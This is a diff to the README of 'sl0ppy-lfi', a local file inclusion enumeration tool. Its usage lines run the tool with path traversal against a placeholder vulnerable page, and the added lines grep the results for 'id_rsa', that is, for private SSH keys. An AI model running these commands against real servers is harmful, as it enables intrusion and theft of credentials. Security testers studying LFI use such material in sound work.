@@ -24,7 +24,9 @@ A small lfi enum tool, i upgraded the original source a bits here and there.
 
 # Enum specific stuff like only libc
 * `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "libc"`
+* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "id_rsa"` 
 * `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "libc"` 
+* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "id_rsa"`
 
 # Output Enum 
 * `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= > output && cat output`  
